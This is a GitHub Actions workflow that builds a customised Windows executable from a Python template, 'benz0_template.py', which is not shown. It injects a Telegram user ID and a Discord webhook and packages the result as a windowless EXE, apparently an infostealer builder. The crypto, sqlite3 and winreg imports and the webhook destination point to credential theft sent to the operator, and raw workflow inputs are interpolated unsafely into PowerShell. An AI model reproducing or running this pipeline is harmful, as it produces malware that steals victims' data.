name: Build EXE

on:
  workflow_dispatch:
    inputs:
      user_id:
        description: 'Telegram User ID'
        required: true
        type: string
      discord_webhook:
        description: 'Discord Webhook (optional)'
        required: false
        type: string
      file_name:
        description: 'Desired EXE file name (without .exe)'
        required: false
        type: string
        default: 'benz0'
      icon_base64:
        description: 'Icon file as base64 (optional)'
        required: false
        type: string

jobs:
  build:
    runs-on: windows-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          pip install pyinstaller pycryptodome requests

      - name: Decode icon (if provided)
        if: github.event.inputs.icon_base64 != ''
        shell: pwsh
        run: |
          $bytes = [Convert]::FromBase64String("${{ github.event.inputs.icon_base64 }}")
          [IO.File]::WriteAllBytes("icon.ico", $bytes)

      - name: Generate build script from template
        shell: pwsh
        run: |
          $template = Get-Content "benz0_template.py" -Raw
          $template = $template -replace 'USER_ID = "REPLACE_ME"', "USER_ID = `"${{ github.event.inputs.user_id }}`""
          if ("${{ github.event.inputs.discord_webhook }}" -ne "") {
            $template = $template -replace 'h00k = "https://discord.com/api/webhooks/..."', "h00k = `"${{ github.event.inputs.discord_webhook }}`""
          }
          $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
          $template | Out-File -FilePath "${filename}.py" -Encoding utf8

      - name: Build EXE with collect-all
        run: |
          $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
          $icon_arg = if (Test-Path "icon.ico") { "--icon=icon.ico" } else { "" }
          pyinstaller --onefile --noconsole `
            --collect-all=Crypto `
            --collect-all=urllib3 `
            --hidden-import=requests `
            --hidden-import=sqlite3 `
            --hidden-import=ctypes `
            --hidden-import=winreg `
            --hidden-import=threading `
            --hidden-import=subprocess `
            --hidden-import=datetime `
            --hidden-import=time `
            --hidden-import=random `
            --hidden-import=re `
            --hidden-import=os `
            --hidden-import=sys `
            --hidden-import=base64 `
            --hidden-import=json `
            --hidden-import=zipfile `
            --hidden-import=shutil `
            --hidden-import=urllib `
            --hidden-import=urllib.request `
            --hidden-import=urllib.parse `
            --hidden-import=urllib.error `
            --hidden-import=traceback `
            --hidden-import=tempfile `
            --hidden-import=glob `
            --hidden-import=struct `
            --hidden-import=socket `
            --hidden-import=ssl `
            --hidden-import=hashlib `
            --hidden-import=hmac `
            --hidden-import=http.client `
            --hidden-import=io `
            --hidden-import=binascii `
            $icon_arg `
            "${filename}.py"
          $exe_name = "${{ github.event.inputs.file_name }}.exe"
          if ("${{ github.event.inputs.file_name }}" -eq "") { $exe_name = "benz0_${{ github.event.inputs.user_id }}.exe" }
          if (Test-Path "dist\${filename}.exe") {
            Rename-Item -Path "dist\${filename}.exe" -NewName $exe_name
          } else {
            Write-Error "EXE not found"
            exit 1
          }

      - name: Upload EXE as artifact
        uses: actions/upload-artifact@v4
        with:
          name: benz0_${{ github.event.inputs.user_id }}
          path: dist/${{ github.event.inputs.file_name }}.exe
